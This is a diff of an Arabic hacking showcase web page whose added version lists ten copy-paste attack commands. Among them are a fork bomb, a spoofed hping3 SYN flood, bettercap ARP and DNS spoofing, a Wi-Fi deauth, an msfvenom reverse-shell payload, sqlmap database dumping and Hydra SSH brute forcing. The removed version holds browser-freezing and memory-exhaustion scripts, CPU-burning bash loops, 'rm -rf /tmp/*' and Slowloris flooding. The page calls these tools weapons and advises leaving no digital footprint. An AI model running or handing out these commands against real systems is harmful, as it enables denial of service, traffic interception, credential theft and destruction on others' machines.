@@ -3,215 +3,233 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مختبر رضا المطور | THE COMPLETE MASTERPIECE</title>
+    <title>DR. REDA | ULTIMATE SECURITY ARCHIVE</title>
     <style>
         :root {
-            --bg: #020617;
-            --panel: #1e293b;
-            --accent: #38bdf8;
-            --text: #f1f5f9;
-            --lvl1: #4ade80;
-            --lvl2: #fbbf24;
-            --lvl3: #f87171;
-            --red-gold: #facc15;
-            --warning: #ef4444;
-            --kali: #2e67ff;
-            --secret: #a855f7;
+            --bg: #010409;
+            --panel: #0d1117;
+            --kali: #218bff;
+            --danger: #f85149;
+            --gold: #f2cc60;
+            --text: #c9d1d9;
+            --code-bg: #000000;
         }
 
-        body {
-            background-color: var(--bg);
-            color: var(--text);
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            margin: 0;
-            display: flex;
-            min-height: 100vh;
-            overflow-x: hidden;
+        body { 
+            background: var(--bg); color: var(--text); 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0; display: flex; flex-direction: column; align-items: center;
+            scroll-behavior: smooth;
         }
 
-        /* القوائم الجانبية */
+        /* زر السهم للطلوع للأعلى */
+        #scrollTopBtn {
+            display: none; position: fixed; bottom: 30px; left: 30px;
+            z-index: 3000; border: none; outline: none;
+            background-color: var(--kali); color: white; cursor: pointer;
+            padding: 15px; border-radius: 50%; font-size: 20px;
+            box-shadow: 0 0 20px var(--kali); transition: 0.3s;
+        }
+        #scrollTopBtn:hover { background-color: var(--gold); color: black; box-shadow: 0 0 25px var(--gold); }
+
+        /* السايد بار */
         .sidebar {
-            width: 350px;
-            background: #020617;
-            transition: 0.5s;
-            position: fixed;
-            height: 100vh;
-            z-index: 1000;
-            overflow-y: auto;
-            box-shadow: 0 0 30px rgba(0,0,0,0.7);
+            width: 350px; background: var(--panel); position: fixed; 
+            height: 100vh; z-index: 2000; transition: 0.6s;
+            border-left: 2px solid var(--kali); border-right: 2px solid var(--gold);
+            overflow-y: auto; box-shadow: 0 0 50px #000;
         }
-        .sidebar-right { right: -350px; border-left: 2px solid var(--accent); }
-        .sidebar-left { left: -350px; border-right: 2px solid var(--red-gold); }
-        .sidebar-right.active { right: 0; }
-        .sidebar-left.active { left: 0; }
+        .sidebar-right { right: -360px; }
+        .sidebar-left { left: -360px; }
+        .sidebar.active { right: 0; left: 0; }
 
-        .sidebar-header { padding: 20px; background: var(--accent); color: #000; font-weight: bold; display: flex; justify-content: space-between; align-items: center; }
-        .header-reda { background: var(--red-gold) !important; }
-
-        .info-item { background: #1e293b; padding: 15px; margin: 12px; border-radius: 10px; font-size: 0.85rem; border-right: 4px solid var(--accent); }
-        .warning-item { border-right: 4px solid var(--warning) !important; background: #2d1a1a; color: #fecaca; }
-        .code-snippet { display: block; background: #000; color: #4ade80; padding: 8px; margin-top: 8px; border-radius: 5px; font-family: monospace; direction: ltr; text-align: left; }
-
-        /* المحتوى الرئيسي */
-        .main-content { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; overflow-y: auto; }
-        
-        .profile-container { margin-top: 20px; margin-bottom: 25px; text-align: center; }
-        .profile-img {
-            width: 280px; 
-            height: auto; 
-            border-radius: 15px; 
-            border: 5px solid var(--red-gold);
-            box-shadow: 0 0 30px rgba(250, 204, 21, 0.4);
+        /* الهيدر */
+        .header-box {
+            text-align: center; margin: 40px 0; padding: 30px;
+            background: #161b22; border-radius: 20px; border: 1px solid #30363d;
+            width: 90%; max-width: 900px; border-bottom: 4px solid var(--gold);
+        }
+        .profile-img { 
+            width: 150px; height: 150px; border-radius: 50%; 
+            border: 3px solid var(--gold); object-fit: cover;
         }
 
-        .btn-group { display: flex; gap: 10px; margin-bottom: 25px; flex-wrap: wrap; justify-content: center; }
-        .trigger-btn { padding: 12px 20px; border-radius: 50px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-        .learn-trigger { background: var(--accent); color: #000; }
-        .reda-trigger { background: var(--red-gold); color: #000; }
-        .kali-btn { background: var(--kali); color: white; border: 2px solid white; box-shadow: 0 0 20px rgba(46, 103, 255, 0.4); }
+        /* الأزرار */
+        .nav-wrap { display: flex; gap: 15px; margin-bottom: 30px; flex-wrap: wrap; justify-content: center; }
+        .btn {
+            padding: 12px 25px; border-radius: 8px; border: 1px solid var(--kali);
+            background: transparent; color: var(--kali); cursor: pointer; font-weight: bold;
+        }
+        .btn-gold { border-color: var(--gold); color: var(--gold); }
+        .btn:hover { background: var(--kali); color: white; }
+        .btn-gold:hover { background: var(--gold); color: black; }
 
-        .kali-tools-grid { display: none; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px; margin-bottom: 20px; width: 90%; max-width: 800px; }
-        .tool-sub-btn { background: #334155; color: white; border: 1px solid var(--kali); padding: 10px; border-radius: 8px; cursor: pointer; font-size: 0.85rem; font-weight: bold; transition: 0.2s; }
-        .tool-sub-btn:hover { background: var(--kali); }
-
-        .card { background: var(--panel); width: 95%; max-width: 900px; padding: 30px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.6); margin-bottom: 30px; }
+        /* الأدوات */
+        #toolsGrid { 
+            display: none; width: 95%; max-width: 1200px; 
+            grid-template-columns: repeat(auto-fit, minmax(450px, 1fr)); gap: 25px; 
+            padding: 20px; margin-bottom: 100px;
+        }
+        .card {
+            background: var(--panel); border-radius: 12px; padding: 25px;
+            border: 1px solid #30363d; border-right: 5px solid var(--kali);
+        }
+        .tech-info { background: rgba(33, 139, 255, 0.05); padding: 15px; border-radius: 8px; margin: 15px 0; font-size: 0.9rem; }
+        .tech-info b { color: var(--gold); }
         
-        .code-box { background: #000; padding: 25px; border-radius: 12px; border-right: 5px solid var(--accent); margin-top: 15px; }
-        .secret-tag { background: var(--secret); color: white; padding: 3px 10px; border-radius: 4px; font-size: 0.7rem; margin-bottom: 10px; display: inline-block; }
-        .code-box pre { margin: 15px 0; color: #4ade80; font-family: monospace; direction: ltr; white-space: pre-wrap; background: #0a0a0a; padding: 15px; border-radius: 5px; border: 1px solid #222; }
-        
-        .level-btn { padding: 8px 15px; border-radius: 8px; border: none; cursor: pointer; background: #334155; color: white; margin: 3px; }
-        .level-btn.active { background: var(--lvl1); color: #000; font-weight: bold; }
-
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(110px, 1fr)); gap: 10px; margin-top: 20px; }
-        .type-btn { background: #0f172a; color: var(--text); border: 1px solid #334155; padding: 12px; border-radius: 10px; cursor: pointer; font-size: 0.85rem; }
-
-        .ask-input { width: 100%; padding: 12px; background: #020617; border: 1px solid #334155; color: white; border-radius: 8px; margin: 10px 0; }
+        .code-box {
+            background: var(--code-bg); color: #4ade80; padding: 15px; border-radius: 8px;
+            font-family: monospace; direction: ltr; text-align: left; font-size: 0.85rem;
+            border: 1px solid #30363d; overflow-x: auto;
+        }
+        .tag { background: var(--danger); padding: 2px 8px; border-radius: 4px; font-size: 0.7rem; float: left; }
     </style>
 </head>
 <body>
 
-<div class="sidebar sidebar-right" id="sidebarRight">
-    <div class="sidebar-header"><span>📖 الموسوعة البرمجية</span><button onclick="toggleSide('Right')">✕</button></div>
-    <div id="infoItems"></div>
-</div>
+    <!-- زر السهم للطلوع للأعلى -->
+    <button onclick="topFunction()" id="scrollTopBtn" title="العودة للأعلى">▲</button>
 
-<div class="sidebar sidebar-left" id="sidebarLeft">
-    <div class="sidebar-header header-reda"><span>👑 ماذا لو كنت رضا؟</span><button onclick="toggleSide('Left')">✕</button></div>
-    <div style="padding: 10px;">
-        <div class="info-item warning-item"><strong>⚠️ تنبيه أمني:</strong> أكواد المستوى 3 تسبب تجميد النظام (System Freeze).</div>
-        <div class="info-item" style="border-right-color: var(--red-gold);"><strong>حكمة رضا:</strong> "البرمجة علم، والاختراق فن، والحماية واجب."</div>
-    </div>
-</div>
-
-<div class="main-content">
-    <div class="profile-container">
-        <img src="13993.png" alt="المطور رضا" class="profile-img">
-    </div>
-
-    <div class="btn-group">
-        <button class="trigger-btn learn-trigger" onclick="toggleSide('Right')">📖 الموسوعة</button>
-        <button class="trigger-btn kali-btn" onclick="toggleKali()">🐉 كالي رضا: الأسرار</button>
-        <button class="trigger-btn reda-trigger" onclick="toggleSide('Left')">👑 فلسفة رضا</button>
-    </div>
-
-    <div class="kali-tools-grid" id="kaliTools">
-        <button class="tool-sub-btn" onclick="showSecret('airodump')">📡 Airodump-ng</button>
-        <button class="tool-sub-btn" onclick="showSecret('nmap')">🔍 Nmap Stealth</button>
-        <button class="tool-sub-btn" onclick="showSecret('slowloris')">🌪️ Slowloris</button>
-        <button class="tool-sub-btn" onclick="showSecret('hping3')">💣 Hping3 Flood</button>
-    </div>
-
-    <div class="card">
-        <h1 style="text-align:center; color: var(--accent); margin:0;">REDA TECH LAB (FULL)</h1>
-        
-        <div style="text-align: center; margin: 20px 0;">
-            <button class="level-btn active" id="l1" onclick="setLevel(1)">المستوى 1</button>
-            <button class="level-btn" id="l2" onclick="setLevel(2)">المستوى 2</button>
-            <button class="level-btn" id="l3" onclick="setLevel(3)">المستوى 3 🔥</button>
-        </div>
-
-        <div class="grid">
-            <button class="type-btn" onclick="generate('logic')">قنبلة منطقية</button>
-            <button class="type-btn" onclick="generate('crash')">استنزاف RAM</button>
-            <button class="type-btn" onclick="generate('bash')">قنابل Bash</button>
-            <button class="type-btn" onclick="generate('network')">Network Flood</button>
-            <button class="type-btn" onclick="generate('bypass')">Bypass</button>
-            <button class="type-btn" onclick="generate('file')">الملفات</button>
-        </div>
-
-        <div id="resultsArea">
-             <div class="code-box"><p style="text-align:center;">اختر أداة لبدء العمل التقني..</p></div>
-        </div>
-
-        <div style="margin-top:30px; border-top: 1px solid #334155; padding-top:20px;">
-            <h3 style="color:var(--red-gold);">💬 استفسار سريع</h3>
-            <input type="text" id="q" class="ask-input" placeholder="اسأل رضا عن أي تقنية...">
-            <button class="trigger-btn reda-trigger" style="padding:8px 25px;" onclick="ask()">إرسال</button>
-            <div id="ans" style="margin-top:15px; padding:15px; background:#1e293b; border-right:4px solid var(--red-gold); display:none;"></div>
+    <!-- الجانب الأيمن: الموسوعة -->
+    <div class="sidebar sidebar-right" id="sbRight">
+        <div style="padding:25px;">
+            <h2 style="color:var(--kali)">📚 موسوعة رضا الأمنية</h2>
+            <p>توثيق العمليات المتقدمة لعام 2026.</p>
+            <hr>
+            <p>• تحليل الشبكات<br>• كسر التشفير<br>• الهندسة الاجتماعية</p>
         </div>
     </div>
-</div>
 
-<script>
-    let lvl = 1;
-    let mem = [];
+    <!-- الجانب الأيسر: ماذا لو كنت رضا -->
+    <div class="sidebar sidebar-left" id="sbLeft">
+        <div style="padding:25px;">
+            <h2 style="color:var(--gold)">👑 ماذا لو كنت رضا؟</h2>
+            <div style="background:rgba(239, 68, 68, 0.1); padding:15px; border:1px solid var(--danger); border-radius:8px;">
+                <h4 style="color:var(--danger); margin-top:0;">🛑 تحذيرات صارمة من Dr. Reda:</h4>
+                <p style="font-size:0.9rem;">1. هذه الأدوات سلاح مدمر، استخدامها خارج المختبر جريمة.<br>
+                2. لا تترك أثراً خلفك (Digital Footprint).<br>
+                3. العلم لحماية الضعفاء وليس لاستغلالهم.</p>
+            </div>
+        </div>
+    </div>
 
-    function toggleSide(s) { document.getElementById('sidebar'+s).classList.toggle('active'); }
-    function setLevel(l) { 
-        lvl = l; 
-        document.querySelectorAll('.level-btn').forEach(b => b.classList.remove('active'));
-        document.getElementById('l'+l).classList.add('active');
-    }
-    function toggleKali() {
-        const g = document.getElementById('kaliTools');
-        g.style.display = (g.style.display === 'grid') ? 'none' : 'grid';
-    }
+    <div class="header-box">
+        <img src="13993.png" alt="Dr. Reda" class="profile-img">
+        <h1 style="color:var(--gold); margin:10px 0;">Dr. REDA | د. رضا</h1>
+        <p style="color:#8b949e;">مطور أنظمة | خبير اختبار الاختراق | Thanaweya Amma 2026</p>
+    </div>
 
-    const secrets = {
-        airodump: { t: "Airodump-ng: صائد الإشارات", s: "يعتمد السر على وضع الـ Monitor Mode لجعل الكرت يسمع كل الأجهزة حوله دون الحاجة للاتصال بها.", c: "sudo airmon-ng start wlan0\nsudo airodump-ng wlan0mon" },
-        nmap: { t: "Nmap: الفحص الشبح", s: "استخدام الـ Stealth Scan يرسل حزم SYN ولا يكمل الاتصال، مما يجعلك تختفي عن سجلات السيرفر.", c: "nmap -sS -Pn -T4 [Target_IP]" },
-        slowloris: { t: "Slowloris: الثقب الأسود", s: "يرسل طلبات HTTP ناقصة ويبقيها مفتوحة ببطء شديد حتى يمتلئ السيرفر ولا يستقبل أحداً غيرك.", c: "python3 slowloris.py example.com -s 500" },
-        hping3: { t: "Hping3: الفيضان النووي", s: "يقوم بتزييف الـ IP الخاص بك (Spoofing) ويرسل ملايين الحزم لتعطيل الهدف تماماً.", c: "sudo hping3 --flood --rand-source -p 80 [Target_IP]" }
-    };
+    <div class="nav-wrap">
+        <button class="btn" onclick="toggleSide('Right')">📖 الموسوعة</button>
+        <button class="btn btn-gold" onclick="toggleTools()">🛠️ مستودع الـ 10 أدوات</button>
+        <button class="btn" onclick="toggleSide('Left')">👑 ماذا لو كنت رضا؟</button>
+    </div>
 
-    function showSecret(t) {
-        const area = document.getElementById('resultsArea');
-        const d = secrets[t];
-        area.innerHTML = `
-            <div class="code-box" style="border-right-color: var(--kali)">
-                <span class="secret-tag">تصنيف: سري للغاية / مختبر رضا</span>
-                <h3 style="color:var(--kali); margin:0;">${d.t}</h3>
-                <p style="font-size:0.9rem; margin:10px 0;"><b>السر التقني:</b> ${d.s}</p>
-                <pre>${d.c}</pre>
-            </div>`;
-    }
+    <div id="toolsGrid">
+        <!-- أداة 1 -->
+        <div class="card">
+            <span class="tag">DDoS</span>
+            <h3>1. Fork Bomb (الانهيار)</h3>
+            <div class="tech-info"><b>🔬 التشريح التقني:</b> استهلاك الـ PID Table عبر تضاعف العمليات أسيًا مما يشل نظام التشغيل تماماً.</div>
+            <div class="code-box">:(){ :|:& };:</div>
+        </div>
 
-    const repo = {
-        logic: { 1: ["alert('System Check');"], 2: ["setInterval(()=>console.log('Loop'),100)"], 3: ["while(true){ window.open('','','width=10,height=10'); }"] },
-        crash: { 1: ["let x = new Array(100)"], 2: ["while(1){ console.count() }"], 3: ["setInterval(()=>{ mem.push(new Uint8Array(100*1024*1024).fill(1)) }, 50)"] },
-        bash: { 1: ["ls -la"], 2: ["cat /dev/zero > test.img"], 3: ["for i in {1..20}; do (while true; do true; done &); done"] },
-        network: { 1: ["ping 127.0.0.1"], 2: ["netstat -rn"], 3: ["while(true){ fetch('http://127.0.0.1', {mode:'no-cors'}) }"] },
-        bypass: { 1: ["Host: ekb.eg"], 2: ["SNI: moe.gov.eg"], 3: ["Payload: [raw][host_port]"] },
-        file: { 1: ["pwd"], 2: ["mkdir lab_files"], 3: ["rm -rf /tmp/*"] }
-    };
+        <!-- أداة 2 -->
+        <div class="card">
+            <span class="tag">Network</span>
+            <h3>2. SYN Flood (Hping3)</h3>
+            <div class="tech-info"><b>🔬 التشريح التقني:</b> إرسال سيل من حزم SYN بعناوين IP وهمية لتعطيل استجابة السيرفر للطلبات الحقيقية.</div>
+            <div class="code-area code-box">sudo hping3 -S --flood --rand-source -p 80 [Target_IP]</div>
+        </div>
 
-    function generate(t) {
-        const area = document.getElementById('resultsArea');
-        area.innerHTML = `<div class="code-box"><pre>> EXEC: ${t.toUpperCase()}\n\n${repo[t][lvl].join('\n')}</pre></div>`;
-    }
+        <!-- أداة 3 -->
+        <div class="card">
+            <span class="tag">MITM</span>
+            <h3>3. ARP Poisoning (Bettercap)</h3>
+            <div class="tech-info"><b>🔬 التشريح التقني:</b> التلاعب بجدول الـ ARP لتوجيه حركة المرور عبر جهازك للتجسس على البيانات.</div>
+            <div class="code-box">bettercap -eval "set arp.spoof.targets [IP]; arp.spoof on; net.sniff on"</div>
+        </div>
 
-    function ask() {
-        const a = document.getElementById('ans');
-        a.style.display = 'block';
-        a.innerHTML = "<strong>رضا يقول:</strong> استمر في التجربة والتعلم، القوة الحقيقية في الفهم لا التخريب.";
-    }
+        <!-- أداة 4 -->
+        <div class="card">
+            <span class="tag">Wifi</span>
+            <h3>4. Deauth Attack (Aireplay)</h3>
+            <div class="tech-info"><b>🔬 التشريح التقني:</b> إرسال حزم قطع اتصال لإخراج المستخدمين من الشبكة قسراً.</div>
+            <div class="code-box">aireplay-ng --deauth 0 -a [BSSID] wlan0mon</div>
+        </div>
 
-    const expert = [{t:"فحص واي فاي", c:"airodump-ng"}, {t:"كشف منافذ", c:"nmap -sV"}, {t:"تخطي حجب", c:"TLS Tunneling"}];
-    const list = document.getElementById('infoItems');
-    expert.forEach((d, i) => {
-        list.innerHTML += `<div class="info-item"><strong>#${i+1}:</strong> ${d.t}<code class="code-snippet">${d.c}</code></div>`;
-    });
-</script>
+        <!-- أداة 5 -->
+        <div class="card">
+            <span class="tag">Payload</span>
+            <h3>5. Reverse Shell (Msfvenom)</h3>
+            <div class="tech-info"><b>🔬 التشريح التقني:</b> برمجة ملف تنفيذي يفتح منفذ اتصال خلفي من الضحية إلى المهاجم لتجاوز جدران الحماية.</div>
+            <div class="code-box">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f exe > shell.exe</div>
+        </div>
+
+        <!-- أداة 6 -->
+        <div class="card">
+            <span class="tag">Web</span>
+            <h3>6. SQL Map (Auto Injection)</h3>
+            <div class="tech-info"><b>🔬 التشريح التقني:</b> أداة آلية لاستغلال ثغرات حقن SQL وسحب قواعد البيانات بالكامل.</div>
+            <div class="code-box">sqlmap -u "http://target.com/id=1" --dbs --batch</div>
+        </div>
+
+        <!-- أداة 7 -->
+        <div class="card">
+            <span class="tag">Sniffing</span>
+            <h3>7. DNS Spoofing</h3>
+            <div class="tech-info"><b>🔬 التشريح التقني:</b> تزوير استجابات DNS لتحويل الضحية إلى خادم مزيف يملكه المهاجم.</div>
+            <div class="code-box">set dns.spoof.domains target.com; set dns.spoof.address [Your_IP]; dns.spoof on</div>
+        </div>
+
+        <!-- أداة 8 -->
+        <div class="card">
+            <span class="tag">Brute Force</span>
+            <h3>8. Hydra (SSH Crack)</h3>
+            <div class="tech-info"><b>🔬 التشريح التقني:</b> تنفيذ هجوم التخمين السريع على بروتوكولات تسجيل الدخول المشفرة.</div>
+            <div class="code-box">hydra -l admin -P passlist.txt ssh://[Target_IP]</div>
+        </div>
+
+        <!-- أداة 9 -->
+        <div class="card">
+            <span class="tag">Exploit</span>
+            <h3>9. Searchsploit (Local DB)</h3>
+            <div class="tech-info"><b>🔬 التشريح التقني:</b> واجهة سطر أوامر للبحث في قاعدة بيانات Exploit-DB عن ثغرات مطابقة للهدف.</div>
+            <div class="code-box">searchsploit "Apache 2.4.49"</div>
+        </div>
+
+        <!-- أداة 10 -->
+        <div class="card">
+            <span class="tag">System</span>
+            <h3>10. Chroot (Jailbreak)</h3>
+            <div class="tech-info"><b>🔬 التشريح التقني:</b> عزل العمليات في بيئة وهمية أو كسر العزل للوصول لملفات النظام الأساسية.</div>
+            <div class="code-box">sudo chroot /mnt/target /bin/bash</div>
+        </div>
+    </div>
+
+    <script>
+        // زر الطلوع للأعلى
+        let mybutton = document.getElementById("scrollTopBtn");
+        window.onscroll = function() {scrollFunction()};
+
+        function scrollFunction() {
+            if (document.body.scrollTop > 300 || document.documentElement.scrollTop > 300) {
+                mybutton.style.display = "block";
+            } else {
+                mybutton.style.display = "none";
+            }
+        }
+
+        function topFunction() {
+            window.scrollTo({top: 0, behavior: 'smooth'});
+        }
+
+        function toggleSide(side) { document.getElementById('sb' + side).classList.toggle('active'); }
+        function toggleTools() {
+            const grid = document.getElementById('toolsGrid');
+            grid.style.display = (grid.style.display === 'grid') ? 'none' : 'grid';
+            if(grid.style.display === 'grid') window.scrollTo({ top: grid.offsetTop, behavior: 'smooth' });
+        }
+    </script>
 </body>
 </html>
